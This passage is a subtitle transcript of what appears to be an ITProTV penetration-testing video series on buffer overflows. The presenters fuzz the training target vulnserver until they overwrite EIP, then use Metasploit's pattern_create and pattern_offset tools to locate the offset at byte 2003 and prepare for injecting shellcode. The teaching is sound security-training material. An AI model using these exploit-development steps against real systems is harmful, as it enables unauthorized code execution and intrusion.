are extended registers, all right?\n\n492\n00:24:12.610 --> 00:24:14.900\nThe stack pointer there.\n\n493\n00:24:14.900 --> 00:24:18.780\nThe stack pointer is the top of the stack.\n\n494\n00:24:18.780 --> 00:24:21.960\nSo, whatever the last thing\nwas that was put on the stack,\n\n495\n00:24:21.960 --> 00:24:23.920\nthat's what is there, okay?\n\n496\n00:24:23.920 --> 00:24:27.820\nThen there's also EBP\nwhich is the base pointer.\n\n497\n00:24:27.820 --> 00:24:30.110\nI think it's the things at\nthe bottom of the stack.\n\n498\n00:24:31.320 --> 00:24:32.430\nSo, top and bottom.\n\n499\n00:24:32.430 --> 00:24:34.520\nWhatever goes in last comes out first.\n\n500\n00:24:34.520 --> 00:24:38.610\nAll right, so we're gonna be manipulating\nand working with these registers, so\n\n501\n00:24:38.610 --> 00:24:39.860\njust be prepared.\n\n502\n00:24:39.860 --> 00:24:40.480\nA lot of times,\n\n503\n00:24:40.480 --> 00:24:43.260\nwhat I'll want you to know about that\nis what are their values, right?\n\n504\n00:24:43.260 --> 00:24:44.990\nSo, that's what you're gonna wanna know.\n\n505\n00:24:46.250 --> 00:24:47.400\nLet's see what else we can learn.\n\n506\n00:24:47.400 --> 00:24:51.900\nSo, we sent up a bunch of As,\nbut we didn't get As in the EIP.\n\n507\n00:24:51.900 --> 00:24:53.150\nI want As in EIP.\n\n508\n00:24:54.360 --> 00:24:57.120\nI definitely wanna go there and beyond.\n\n509\n00:24:57.120 --> 00:24:59.410\nSo, 2000 got me to crash.\n\n510\n00:24:59.410 --> 00:25:00.850\nBut it didn't get me where I wanna be.\n\n511\n00:25:00.850 --> 00:25:02.440\nSo, I'm gonna send more data at it, and\n\n512\n00:25:02.440 --> 00:25:05.950\nhopefully I can overflow\ninto another register.\n\n513\n00:25:05.950 --> 00:25:08.960\nCuz we've stayed in the EAX register.\n\n514\n00:25:08.960 --> 00:25:09.880\nWe've sent input to it, but\n\n515\n00:25:09.880 --> 00:25:13.880\nwe haven't overflowed into other\nregisters, that's what we wanna do.\n\n516\n00:25:13.880 --> 00:25:16.320\nSo, send more As at it,\nand see what happens.\n\n517\n00:25:16.320 --> 00:25:18.830\n&gt;&gt; [LAUGH]\n&gt;&gt; So I need to, just hit the red x here,\n\n518\n00:25:18.830 --> 00:25:20.710\nthat closes that down.\n\n519\n00:25:20.710 --> 00:25:27.065\nAnd then we restart server, and then\nI'll restart Immunity and we re-attach.\n\n520\n00:25:31.696 --> 00:25:35.910\nServer there you are, and\nattach and then hit play.\n\n521\n00:25:35.910 --> 00:25:38.054\nAll right so, back on action,\n\n522\n00:25:38.054 --> 00:25:42.800\nlet's go back to our trusted\nlittle fuzzer and we re-run it.\n\n523\n00:25:42.800 --> 00:25:47.365\nAnd this time I will throw 3,000 at it.\n\n524\n00:25:47.365 --> 00:25:49.310\nHit return.\n\n525\n00:25:49.310 --> 00:25:51.470\nThere we go.\nDefinitely got a crash because it's\n\n526\n00:25:51.470 --> 00:25:53.520\nnot doing what we expect it to do.\n\n527\n00:25:53.520 --> 00:25:56.260\nIf we go back full screen just for\na second.\n\n528\n00:25:56.260 --> 00:25:59.930\nBottom right hand corner of the screen,\nwe are paused yet again.\n\n529\n00:25:59.930 --> 00:26:04.990\nAnd this time, if we look in the EIP,\nthe instruction pointer What is that?\n\n530\n00:26:04.990 --> 00:26:06.975\n41, 41, 41, 41.\n\n531\n00:26:06.975 --> 00:26:09.820\nWe have successfully sent data.\n\n532\n00:26:09.820 --> 00:26:14.460\nWe've overflowed that EAX register and\nit has gone into the EIP,\n\n533\n00:26:14.460 --> 00:26:16.290\nbecause it's showing me the six values.\n\n534\n00:26:16.290 --> 00:26:18.840\nI can probably follow that in the dump.\n\n535\n00:26:20.320 --> 00:26:22.460\nNo, it won't allow you to do\nthat if you're in the dump.\n\n536\n00:26:22.460 --> 00:26:27.130\nBut if you also notice above, look at\nall these As right here in the ESP.\n\n537\n00:26:27.130 --> 00:26:30.150\nWhere's the ESP and\nit's the top of the stack.\n\n538\n00:26:30.150 --> 00:26:33.620\nMeans it will be the first thing\nexecuted if it were a program.\n\n539\n00:26:33.620 --> 00:26:35.360\nBut there's nothing there.\n\n540\n00:26:35.360 --> 00:26:40.100\nIt crashed the system because AAAAAA and\non is not a program.\n\n541\n00:26:40.100 --> 00:26:41.440\nIt's just input.\n\n542\n00:26:41.440 --> 00:26:42.910\nDoesn't know what to do with that.\n\n543\n00:26:42.910 --> 00:26:43.750\nSo it crashed.\n\n544\n00:26:43.750 --> 00:26:45.040\nIt stopped working.\n\n545\n00:26:45.040 --> 00:26:48.650\nWe're gonna put arbitrary\ncode in these things.\n\n546\n00:26:48.650 --> 00:26:50.850\nAnd make them do what we want them to do,\nall right.\n\n547\n00:26:50.850 --> 00:26:51.860\nThat's what we're gonna do.\n\n548\n00:26:51.860 --> 00:26:54.650\nSo, it was good that\nwe overflowed the EAX,\n\n549\n00:26:54.650 --> 00:26:57.500\nwe overflowed into EIP that was\ndefinitely a good part of it.\n\n550\n00:26:57.500 --> 00:27:00.640\nAnd the ESP is where we're\ngonna store our malicious code,\n\n551\n00:27:00.640 --> 00:27:04.220\nand we've got plenty of\nroom there apparently and\n\n552\n00:27:04.220 --> 00:27:06.660\nwe can manipulate with that\ndata work with that data.\n\n553\n00:27:06.660 --> 00:27:08.310\nThat is where we are moving to next.\n\n554\n00:27:09.600 --> 00:27:13.450\n&gt;&gt; All right,\nDaniel perfect we are getting really close\n\n555\n00:27:13.450 --> 00:27:14.710\nto seeing this thing work.\n\n556\n00:27:14.710 --> 00:27:16.160\nWe found some important spots.\n\n557\n00:27:16.160 --> 00:27:20.490\nWe've actually successfully created\na fuzzer, that was great, right?\n\n558\n00:27:20.490 --> 00:27:21.800\nWe got to see Daniel do that.\n\n559\n00:27:21.800 --> 00:27:23.820\nWe applied that fuzzer at our application.\n\n560\n00:27:23.820 --> 00:27:27.550\nWe're able to crash the application,\nand we can see where that's data going.\n\n561\n00:27:27.550 --> 00:27:30.660\nSo, we're definitely on\nthe road to successfully\n\n562\n00:27:30.660 --> 00:27:33.580\nexecuting a buffer overflow\non this volt server.\n\n563\n00:27:33.580 --> 00:27:34.810\nFantastic.\n\n564\n00:27:34.810 --> 00:27:37.150\nGreat demonstrations Daniel,\nwe thank you for that.\n\n565\n00:27:37.150 --> 00:27:39.710\nWe hope everybody out there\nenjoyed watching this one,\n\n566\n00:27:39.710 --> 00:27:41.059\nobviously there is another one coming.\n\n567\n00:27:41.059 --> 00:27:43.050\n&gt;&gt; [LAUGH]\n&gt;&gt; So make sure you tune back in for\n\n568\n00:27:43.050 --> 00:27:46.680\npart three as we continue on with\nour series on buffer overflows,\n\n569\n00:27:46.680 --> 00:27:50.190\nwhich is a little mini series\nwithin our penetration testing.\n\n570\n00:27:50.190 --> 00:27:52.920\nSo again, thanks for watching,\nsigning off for ITProTV.\n\n571\n00:27:52.920 --> 00:27:53.694\nI've been your host Mike Rodrick.\n\n572\n00:27:53.694 --> 00:27:54.769\n&gt;&gt; I'm

00:00:04.382\n[CROSSTALK]\n\n4\n00:00:04.382 --> 00:00:08.063\n[MUSIC]\n\n5\n00:00:08.063 --> 00:00:10.547\n&gt;&gt; You're watching ITProTV.\n\n6\n00:00:10.547 --> 00:00:12.324\n[MUSIC]\n\n7\n00:00:12.324 --> 00:00:15.691\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n8\n00:00:15.691 --> 00:00:19.940\nI'm your host, Mike Rodrick, and\ntoday we're doing penetration testing.\n\n9\n00:00:19.940 --> 00:00:24.830\nIn this episode, we're gonna be continuing\nour thought process on buffer overflows.\n\n10\n00:00:24.830 --> 00:00:27.200\nWe've already done a couple parts\nwhere we're getting things set up, so\n\n11\n00:00:27.200 --> 00:00:29.350\nmake sure you go back and watch those.\n\n12\n00:00:29.350 --> 00:00:33.840\nAt this point, we've got things set up and\nwe've started sending some data\n\n13\n00:00:33.840 --> 00:00:37.450\ninto what we think is our vulnerable\napplication, doing fuzzing\n\n14\n00:00:37.450 --> 00:00:41.310\nwith our fuzzer that we wrote ourselves\nin a previous episode as well.\n\n15\n00:00:41.310 --> 00:00:43.750\nSo we're just gonna continue\non from that point,\n\n16\n00:00:43.750 --> 00:00:47.500\nand here to guide us the rest of\nthe way It's Mr Daniel Lowrie.\n\n17\n00:00:47.500 --> 00:00:48.360\nWelcome back, Daniel.\n\n18\n00:00:48.360 --> 00:00:49.580\n&gt;&gt; Mike, so glad to be back.\n\n19\n00:00:49.580 --> 00:00:53.500\nObviously we again left you guys with\na bit of a cliffhanger as we like to do.\n\n20\n00:00:53.500 --> 00:00:56.450\n&gt;&gt; We do.\n&gt;&gt; That gives wanting more salivating for\n\n21\n00:00:56.450 --> 00:00:59.120\nthe next part of that apple and\nthat's where we're gonna continue.\n\n22\n00:00:59.120 --> 00:01:01.520\nWe're gonna pick right\nback up where we left off.\n\n23\n00:01:01.520 --> 00:01:04.840\nLet's just quickly grasp\nwhere we should be.\n\n24\n00:01:04.840 --> 00:01:10.788\nAnd that was we ran our fuzzer, we sent\n3,000 bytes of data, which were all As.\n\n25\n00:01:10.788 --> 00:01:15.787\nWe sent 3,000 As to our system plus a\nlittle bit of a command at the beginning,\n\n26\n00:01:15.787 --> 00:01:18.720\nright, and\nwe were able to crash our program.\n\n27\n00:01:18.720 --> 00:01:21.980\nAnd we were able to overflow\ninto different registers.\n\n28\n00:01:21.980 --> 00:01:23.100\nAnd none of that makes sense to you?\n\n29\n00:01:23.100 --> 00:01:25.560\nThat means you need to go back and\nwatch part one.\n\n30\n00:01:25.560 --> 00:01:26.506\nAnd two, I guess.\n\n31\n00:01:26.506 --> 00:01:28.004\n[LAUGH] Definitely part two.\n\n32\n00:01:28.004 --> 00:01:31.960\nAnd you'll probably be able to\nfollow along a little bit better.\n\n33\n00:01:31.960 --> 00:01:32.980\nSo that's where we are.\n\n34\n00:01:32.980 --> 00:01:38.220\nAnd now we need to move into one of my\nfavorite parts of doing buffer overflows.\n\n35\n00:01:38.220 --> 00:01:43.090\nAnd it's finding the exact four\nbytes that the EIP takes up.\n\n36\n00:01:43.090 --> 00:01:49.710\nSo remember, we sent 3,000 As basically\nto our system, and it crashed it.\n\n37\n00:01:49.710 --> 00:01:52.434\nAnd we look at EIP, let's actually,\nlet's jump to my screen really quickly.\n\n38\n00:01:52.434 --> 00:01:55.544\nAnd we looked in,\nI left it up from our previous show.\n\n39\n00:01:55.544 --> 00:02:00.409\nYou'll notice that the EIP we\nsaw that it had 41, 41, 41,\n\n40\n00:02:00.409 --> 00:02:04.910\n41, which is the computer\nequivalent to four As.\n\n41\n00:02:04.910 --> 00:02:07.870\nI need to know exactly\nwhich four As those are.\n\n42\n00:02:07.870 --> 00:02:10.730\n&gt;&gt; That out of the 3,000,\nwhich four As ended up there, right?\n\n43\n00:02:10.730 --> 00:02:11.620\n&gt;&gt; Yeah, exactly.\n\n44\n00:02:12.940 --> 00:02:14.180\nThat's not easy, right?\n\n45\n00:02:14.180 --> 00:02:18.243\nThat's just like,\nanswer your question and out of 3,000.\n\n46\n00:02:18.243 --> 00:02:20.391\nYeah, that could be a little difficult.\n\n47\n00:02:20.391 --> 00:02:23.620\nAnd it is a little difficult,\nespecially if you do it the hard way.\n\n48\n00:02:23.620 --> 00:02:26.694\nWhich sometimes you may want to do,\nyou may have to do for various reasons.\n\n49\n00:02:26.694 --> 00:02:28.191\nI can't think of any off\nthe top of my head, but.\n\n50\n00:02:28.191 --> 00:02:31.226\n&gt;&gt; [LAUGH]\n&gt;&gt; Hey, I have done it, just so\n\n51\n00:02:31.226 --> 00:02:33.017\nthat I can say I did it.\n\n52\n00:02:33.017 --> 00:02:34.230\nIt took me an hour.\n\n53\n00:02:34.230 --> 00:02:36.031\n&gt;&gt; [LAUGH]\n&gt;&gt; But also the easy way,\n\n54\n00:02:36.031 --> 00:02:37.554\nwhich takes like four seconds.\n\n55\n00:02:37.554 --> 00:02:40.862\n&gt;&gt; [LAUGH]\n&gt;&gt; But what we gonna do is basically,\n\n56\n00:02:40.862 --> 00:02:44.790\nlet's explain the hard way so\nyou know what I'm talking about.\n\n57\n00:02:44.790 --> 00:02:52.090\nWhat I need to do is go, okay, I sent\n3,000 As, which, let's divide that up.\n\n58\n00:02:52.090 --> 00:02:56.323\nLet's send out 1,500 As and\n1,500 Bs, okay, and\n\n59\n00:02:56.323 --> 00:02:59.318\nthen let's see which one lands in the EIP.\n\n60\n00:02:59.318 --> 00:03:01.201\nIt's all one big string of data,\n\n61\n00:03:01.201 --> 00:03:05.380\nwe're just kinda splitting up what\nthe data is between As and Bs.\n\n62\n00:03:05.380 --> 00:03:09.540\nSo I'll spend 3,000 bytes of data,\nhalf of them will be As,\n\n63\n00:03:09.540 --> 00:03:11.040\nthe other half will be Bs.\n\n64\n00:03:11.040 --> 00:03:12.130\nI could do that.\n\n65\n00:03:12.130 --> 00:03:16.850\nThen I look, I say, did 41 show\nup in the EIP, or did 42 show up,\n\n66\n00:03:16.850 --> 00:03:19.270\nwhich is a B, in the EIP?\n\n67\n00:03:19.270 --> 00:03:21.700\nOkay, it was 42, for instance.\n\n68\n00:03:21.700 --> 00:03:26.150\nOkay, well, now I know that the EIP\ninformation, those four bytes I'm looking\n\n69\n00:03:26.150 --> 00:03:30.087\nfor, are in the latter half of\nthe 3,000 bytes of data that I sent.\n\n70\n00:03:30.087 --> 00:03:32.455\n&gt;&gt; You made some progress,\nyou went from 3,000 to 1,500.\n\n71\n00:03:32.455 --> 00:03:35.450\nI've only gotta figure out\nwhere 4 bytes in 1,500 is now.\n\n72\n00:03:35.450 --> 00:03:36.890\n&gt;&gt; That's right, whittling it down.\n\n73\n00:03:36.890 --> 00:03:38.520\nSo what do I do now?\n\n74\n00:03:38.520 --> 00:03:39.550\nI break that in half.\n\n75\n00:03:39.550 --> 00:03:41.918\nI say, okay, now I'm sending 750.\n\n76\n00:03:41.918 --> 00:03:44.577\n&gt;&gt; 1,500 Cs, 750 Bs.\n\n77\n00:03:44.577 --> 00:03:47.480\n&gt;&gt; And 750 Cs, right.\n\n78\n00:03:47.480 --> 00:03:49.720\nWhich one ends up in the EIP?\n\n79\n00:03:49.720 --> 00:03:51.850\nIs it B again or is it gonna be C, right?\n\n80\n00:03:51.850 --> 00:03:54.150\nNow I'm starting to figure out where.\n\n81\n00:03:54.150 --> 00:03:57.680\nAnd you just continue that\nprocess of having that, and\n\n82\n00:03:57.680 --> 00:03:58.940\nit takes a little bit of math.\n\n83\n00:03:58.940 --> 00:04:01.380\nIt takes a little bit of time\ncreating new variables so\n\n84\n00:04:01.380 --> 00:04:03.970\nthat you can find out which one does that.\n\n85\n00:04:03.970 --> 00:04:05.310\nThat's the hard way of doing it.\n\n86\n00:04:05.310 --> 00:04:07.540\nAnd eventually you'll be\nleft with one option,\n\n87\n00:04:07.540 --> 00:04:09.760\nthese are the four bytes that you need.\n\n88\n00:04:09.760 --> 00:04:10.430\nOkay, perfect.\n\n89\n00:04:10.430 --> 00:04:14.800\nThose four bytes landed on this side\nof the eight bytes that I sent.\n\n90\n00:04:14.800 --> 00:04:17.330\nAnd now I know where they are,\nI know exactly where that is.\n\n91\n00:04:17.330 --> 00:04:21.540\nHard way to do it, but it's probably\nsomething you'd wanna probably try.\n\n92\n00:04:21.540 --> 00:04:24.930\nAt least since you understand\nthe concept of what's happening and\n\n93\n00:04:24.930 --> 00:04:26.710\nyou were able to\nsuccessfully execute that.\n\n94\n00:04:28.090 --> 00:04:28.878\nNow the easy way.\n\n95\n00:04:28.878 --> 00:04:31.840\nThe good thing is that there\nare people who have realized that\n\n96\n00:04:31.840 --> 00:04:32.760\nthat is very difficult.\n\n97\n00:04:32.760 --> 00:04:34.430\nLet us help you with that.\n\n98\n00:04:34.430 --> 00:04:37.100\nAnd thank you,\ngood people who create these things.\n\n99\n00:04:37.100 --> 00:04:38.616\nI don't know who you are, but\n\n100\n00:04:38.616 --> 00:04:41.415\nI will send you a lovely fruit\nbasket if I ever find out.\n\n101\n00:04:41.415 --> 00:04:43.291\n&gt;&gt; [LAUGH]\n&gt;&gt; That being said,\n\n102\n00:04:43.291 --> 00:04:47.170\nlet's jump back into our computer and\nsee the easy way to do this.\n\n103\n00:04:47.170 --> 00:04:51.450\nAgain, I could go into my exploits and\ndo that, but I don't wanna do that.\n\n104\n00:04:51.450 --> 00:04:53.320\nI do need to Ctrl+C this.\n\n105\n00:04:53.320 --> 00:04:57.430\nThat will, let me kill all that,\nno virtual machine.\n\n106\n00:04:57.430 --> 00:04:58.068\nThere we go.\n\n107\n00:04:58.068 --> 00:04:59.880\nHere's what we're gonna do.\n\n108\n00:04:59.880 --> 00:05:03.604\nWe're gonna run a little thing called\na Ruby script actually, a Ruby program,\n\n109\n00:05:03.604 --> 00:05:06.398\ncalled pattern_create, or\npattern underscore create.\n\n110\n00:05:06.398 --> 00:05:12.170\nAnd it's gonna create a pattern\nof unique characters.\n\n111\n00:05:12.170 --> 00:05:14.783\nWow, that's interesting,\nwhy are we gonna do that?\n\n112\n00:05:14.783 --> 00:05:15.966\nI'm glad you asked,\n\n113\n00:05:15.966 --> 00:05:21.110\nbecause we're gonna create a pattern of\nunique characters that's 3,000 bytes long.\n\n114\n00:05:21.110 --> 00:05:22.350\nYou see where I'm going with this?\n\n115\n00:05:22.350 --> 00:05:26.786\nIf I have a unique string that\nthere's never repeating characters,\n\n116\n00:05:26.786 --> 00:05:29.932\nI'll be able to immediately\nfind where that is.\n\n117\n00:05:29.932 --> 00:05:34.050\nAnd then we're gonna use another Ruby\nscript to further us down that road.\n\n118\n00:05:34.050 --> 00:05:34.820\n&gt;&gt; Clever.\n\n119\n00:05:34.820 --> 00:05:35.703\n&gt;&gt; All right, so let's do that.\n\n120\n00:05:35.703 --> 00:05:39.523\nLet me fire up my vulnserver yet\nagain, run as administrator.\n\n121\n00:05:39.523 --> 00:05:42.550\nYeah, can you get out of my way,\nplease, the window?\n\n122\n00:05:42.550 --> 00:05:43.510\nThank you.\n\n123\n00:05:43.510 --> 00:05:47.440\nThere we go, run the system administrator,\nattach the service.\n\n124\n00:05:47.440 --> 00:05:53.289\nName, go down to vulnserve, and attach.\n\n125\n00:05:53.289 --> 00:05:55.830\nAnd hit the good old Play button.\n\n126\n00:05:55.830 --> 00:05:56.350\nSo here we go.\n\n127\n00:05:57.480 --> 00:06:01.210\nSo now we're going to take a look at our,\nlet me see here.\n\n128\n00:06:01.210 --> 00:06:04.840\nI created these beforehand, obviously,\nso that we don't have to do this.\n\n129\n00:06:04.840 --> 00:06:08.080\nLet's do the pattern_create thing first,\nlet's show you this.\n\n130\n00:06:08.080 --> 00:06:12.090\nI'm gonna locate, in Kali, it's already\nthere, you should be able to find it.\n\n131\n00:06:12.090 --> 00:06:15.740\nI'm pretty sure this comes preloaded\nwith all your Kali dist rows.\n\n132\n00:06:15.740 --> 00:06:22.854\nSo I'm gonna locate pattern_create.rb.\n\n133\n00:06:22.854 --> 00:06:23.969\nAnd there it is.\n\n134\n00:06:23.969 --> 00:06:25.792\nSo that's where this resides.\n\n135\n00:06:25.792 --> 00:06:27.835\nSo now I'm just gonna copy that.\n\n136\n00:06:32.190 --> 00:06:33.770\nAnd we are going to run it.\n\n137\n00:06:33.770 --> 00:06:35.800\nSo I'll paste it here.\n\n138\n00:06:37.770 --> 00:06:43.191\nAnd we are going to run the length,\nso -l and I'm gonna say 3000.\n\n139\n00:06:43.191 --> 00:06:48.590\nIt's churning away, it's doing its thing,\nit's creating this pattern for us.\n\n140\n00:06:48.590 --> 00:06:51.405\nAnd wowsers, that's a lot of data.\n\n141\n00:06:51.405 --> 00:06:56.494\nBut that's a 3,000 byte string of\nunique data that's never gonna repeat.\n\n142\n00:06:56.494 --> 00:07:00.300\n&gt;&gt; And 3,000 because during our\nfuzzing we realized that 3,000\n\n143\n00:07:00.300 --> 00:07:03.120\nwas the number that we could use and\nwe knew it would crash the program.\n\n144\n00:07:03.120 --> 00:07:04.860\n&gt;&gt; Correct, that's what we're doing.\n\n145\n00:07:04.860 --> 00:07:06.733\nTechnically it's a little\nbit less than that.\n\n146\n00:07:06.733 --> 00:07:10.951\nBut hey, the more space that you have,\nthe better, for your exploit\n\n147\n00:07:10.951 --> 00:07:15.670\nbecause then you can have larger\nexploit code, or shell code, to inject.\n\n148\n00:07:15.670 --> 00:07:17.790\nSo the more space you have, the better.\n\n149\n00:07:17.790 --> 00:07:20.220\nAnd we have 3,000,\nwhich is plenty for this.\n\n150\n00:07:20.220 --> 00:07:22.160\nSo there's our unique string.\n\n151\n00:07:22.160 --> 00:07:26.220\nWe would then add that\ninto our Python code,\n\n152\n00:07:26.220 --> 00:07:30.440\nour fuzzer, and\nsend that the way of vulnserve.\n\n153\n00:07:30.440 --> 00:07:36.100\nSo let's see here, I think I did\nthat into, let's see here, LS.\n\n154\n00:07:36.100 --> 00:07:39.030\nSo what I did was basically\njust copy this string like so.\n\n155\n00:07:39.030 --> 00:07:40.810\nRight-click, copy, like that.\n\n156\n00:07:40.810 --> 00:07:42.100\nYou know how to do that, copy and paste.\n\n157\n00:07:42.100 --> 00:07:42.850\nIt's a simple function.\n\n158\n00:07:43.930 --> 00:07:47.066\nAnd I will nano 2futs.py.\n\n159\n00:07:47.066 --> 00:07:47.984\nYeah, that's what I did.\n\n160\n00:07:47.984 --> 00:07:51.385\nYou'll notice that same code,\nno different.\n\n161\n00:07:51.385 --> 00:07:52.920\nTCP-IP port is there.\n\n162\n00:07:52.920 --> 00:07:54.430\nThis is all the same stuff.\n\n163\n00:07:54.430 --> 00:07:55.720\nI changed the attack.\n\n164\n00:07:55.720 --> 00:07:59.480\nIt no longer says a times length.\n\n165\n00:07:59.480 --> 00:08:04.148\nIt is my unique string,\nwhich goes well off the page.\n\n166\n00:08:04.148 --> 00:08:05.733\nIt doesn't word wrap in nano.\n\n167\n00:08:05.733 --> 00:08:09.800\nSo, it's just going off into the distance\nlike a right fielder, right?\n\n168\n00:08:09.800 --> 00:08:12.202\n&gt;&gt; [LAUGH]\n&gt;&gt; He's out there in no man's land.\n\n169\n00:08:12.202 --> 00:08:13.530\nBut that's what that is.\n\n170\n00:08:13.530 --> 00:08:14.225\nThat's, that string.\n\n171\n00:08:14.225 --> 00:08:17.400\nSo now, we can throw this script at it.\n\n172\n00:08:17.400 --> 00:08:20.870\nI like to separate those scripts out,\njust kinda copy and paste or move them.\n\n173\n00:08:21.980 --> 00:08:23.847\nSo, that I don't have to keep rewriting.\n\n174\n00:08:23.847 --> 00:08:26.530\nI can just I can mess with them as I want.\n\n175\n00:08:26.530 --> 00:08:29.153\nIf I need to go back, I don't have\nto do a bunch of code editing.\n\n176\n00:08:29.153 --> 00:08:30.236\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] To make that\n\n177\n00:08:30.236 --> 00:08:31.054\nback the way it was.\n\n178\n00:08:31.054 --> 00:08:34.790\nI still have that one laying around,\nso just copy this one.\n\n179\n00:08:34.790 --> 00:08:35.782\nAll right, let's Ctrl+X.\n\n180\n00:08:35.782 --> 00:08:43.830\nLet us run, don't forget the chmod +\nx on your, if you created a new one.\n\n181\n00:08:43.830 --> 00:08:48.802\nOr if it didn't copy the permissions over,\njust wanna make sure it's executable,\n\n182\n00:08:48.802 --> 00:08:50.423\nand we will do 2fuzz.py.\n\n183\n00:08:50.423 --> 00:08:52.490\nEverything is running,\neverything is running.\n\n184\n00:08:52.490 --> 00:08:53.492\nAll right, we're ready to go.\n\n185\n00:08:53.492 --> 00:08:58.018\nLength of attack, we'll say 3,000,\nit's really, doesn't matter at this point,\n\n186\n00:08:58.018 --> 00:08:59.150\nI could take that out.\n\n187\n00:08:59.150 --> 00:09:01.684\nBut it's sending the data.\n\n188\n00:09:01.684 --> 00:09:05.590\nAnd now it's paused,\nwe've crashed the program successfully.\n\n189\n00:09:05.590 --> 00:09:07.161\nAnd now you don't see a bunch of As.\n\n190\n00:09:07.161 --> 00:09:13.180\nYou'll notice that the term command\nover here is our unique string of data.\n\n191\n00:09:13.180 --> 00:09:17.697\nAnd then also in ESP is more\nof our unique string of data.\n\n192\n00:09:17.697 --> 00:09:21.480\nAnd in EIP, a unique string of data.\n\n193\n00:09:21.480 --> 00:09:22.649\nThis is an important thing.\n\n194\n00:09:22.649 --> 00:09:24.530\nWe need to know this value.\n\n195\n00:09:24.530 --> 00:09:28.675\nSo, that we can find that value\nin the midst of our unique data.\n\n196\n00:09:28.675 --> 00:09:32.549\nCool thing is, guess what, there's\na Ruby script that does that for us and\n\n197\n00:09:32.549 --> 00:09:36.007\nit is built into Kali as I make Mike\nchoke on this water it's funny.\n\n198\n00:09:36.007 --> 00:09:37.533\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n199\n00:09:37.533 --> 00:09:38.513\n&gt;&gt; You guys can't see what's going on\n\n200\n00:09:38.513 --> 00:09:39.074\noff screen, I can.\n\n201\n00:09:39.074 --> 00:09:40.304\nIt's funny.\n\n202\n00:09:40.304 --> 00:09:41.593\nAll right, so we need this.\n\n203\n00:09:41.593 --> 00:09:43.080\nWe need to write this down.\n\n204\n00:09:43.080 --> 00:09:44.269\nThis is an important thing for us.\n\n205\n00:09:44.269 --> 00:09:47.307\nSo whip out your scratch pad,\nmaybe type it in, copy and past it,\n\n206\n00:09:47.307 --> 00:09:48.540\ndo whatever you wanna do.\n\n207\n00:09:49.690 --> 00:09:51.323\nThat's fine.\nI have to be quick to write these\n\n208\n00:09:51.323 --> 00:09:51.880\nthings down.\n\n209\n00:09:51.880 --> 00:09:54.247\nI'm an old school kinda guy when\nit comes to a lot of this stuff.\n\n210\n00:09:54.247 --> 00:09:57.933\nI just write them down cuz it's easier for\nme instead of swiping back and\n\n211\n00:09:57.933 --> 00:10:00.340\nforth or where's my file, where's my file?\n\n212\n00:10:00.340 --> 00:10:01.875\nOpen that up, minimize that.\n\n213\n00:10:01.875 --> 00:10:02.660\nIt's always in the way.\n\n214\n00:10:02.660 --> 00:10:06.930\nA little scratch pad down by the side\ncan help out a lot in that area.\n\n215\n00:10:06.930 --> 00:10:11.530\nSo here, it's gonna be 386F4337.\n\n216\n00:10:11.530 --> 00:10:14.850\nThose are our four hex values, okay?\n\n217\n00:10:14.850 --> 00:10:15.740\nWrite those down.\n\n218\n00:10:16.740 --> 00:10:18.505\nWe're gonna take that back over to Kali.\n\n219\n00:10:18.505 --> 00:10:22.990\nAnd we're gonna say, first,\nwe're gonna kill this.\n\n220\n00:10:22.990 --> 00:10:24.831\nAnd we're going to do another locate.\n\n221\n00:10:24.831 --> 00:10:29.241\nAnd it's going to pattern_,\n\n222\n00:10:29.241 --> 00:10:32.478\nI think it's offset.\n\n223\n00:10:32.478 --> 00:10:34.433\nUnderscore offset.rb,\n\n224\n00:10:34.433 --> 00:10:40.125\nthat it's in the exact same folder how\nabout that, who would have thought?\n\n225\n00:10:40.125 --> 00:10:42.700\nBut if it wasn't, now you know.\n\n226\n00:10:42.700 --> 00:10:47.789\nSo just copy and paste that yet\nagain copy, paste that.\n\n227\n00:10:47.789 --> 00:10:52.874\nThere we go and this time,\nwhat we gonna do is give that EIP value,\n\n228\n00:10:52.874 --> 00:10:55.380\nor we gonna say the same length.\n\n229\n00:10:55.380 --> 00:10:58.600\nSo let's say our length is 3000, and\n\n230\n00:10:58.600 --> 00:11:02.837\noops I'm gonna help if I\ndo -l there we go, 3000.\n\n231\n00:11:02.837 --> 00:11:07.091\nThen we gonna say -q and\ngive it that EIP length.\n\n232\n00:11:07.091 --> 00:11:10.632\nAnd of course, I didn't write it down.\n\n233\n00:11:10.632 --> 00:11:18.109\n386f so, 386f\n&gt;&gt; 4337?\n\n234\n00:11:18.109 --> 00:11:19.573\n&gt;&gt; Was it 4337?\n\n235\n00:11:19.573 --> 00:11:21.004\nLook at you, Mike is amazing.\n\n236\n00:11:21.004 --> 00:11:22.885\n4337 here we go.\n\n237\n00:11:22.885 --> 00:11:23.546\n&gt;&gt; You told me to write it down.\n\n238\n00:11:23.546 --> 00:11:24.394\n[LAUGH]\n&gt;&gt; Yeah, you did and\n\n239\n00:11:24.394 --> 00:11:26.579\nhe follows instructions,\nhe's a good student.\n\n240\n00:11:26.579 --> 00:11:28.243\nAll right, let's see what happens.\n\n241\n00:11:28.243 --> 00:11:29.778\nHit Enter.\n\n242\n00:11:29.778 --> 00:11:30.751\nAway we go.\n\n243\n00:11:30.751 --> 00:11:35.298\nWe're trying to burn,\nexact match of offset at byte 2003.\n\n244\n00:11:35.298 --> 00:11:36.816\nThat's what we need to know.\n\n245\n00:11:36.816 --> 00:11:38.353\nSo what does that mean?\n\n246\n00:11:38.353 --> 00:11:40.320\nCuz it's a little cryptic.\n\n247\n00:11:40.320 --> 00:11:45.520\nWhat it means is, it found that string,\nthat string that we put here, this q.\n\n248\n00:11:45.520 --> 00:11:51.642\nThis that IEP, if found that in\nthat 3000 byte characters right?\n\n249\n00:11:51.642 --> 00:11:56.348\nAnd 3000 by unique strength and\nit said, it's at offset 2003.\n\n250\n00:11:56.348 --> 00:12:00.376\nSo by one, by two,\nby three always are right after by 2003,\n\n251\n00:12:00.376 --> 00:12:02.100\nthat's how we found this.\n\n252\n00:12:02.100 --> 00:12:03.987\nSo, it's 2004, 2005, 2006 and\n\n253\n00:12:03.987 --> 00:12:06.591\n2007 that's stuff four by\nstring that's where it resigns.\n\n254\n00:12:06.591 --> 00:12:09.381\nThat's what we need to know,\nthat's important information.\n\n255\n00:12:09.381 --> 00:12:15.930\nWe have now found where the EIP is\ngetting written to, the exact portion.\n\n256\n00:12:15.930 --> 00:12:18.306\nNow we can set that inside of our code,\n\n257\n00:12:18.306 --> 00:12:22.031\nthat lends to getting us to\nthe end game of the exploit 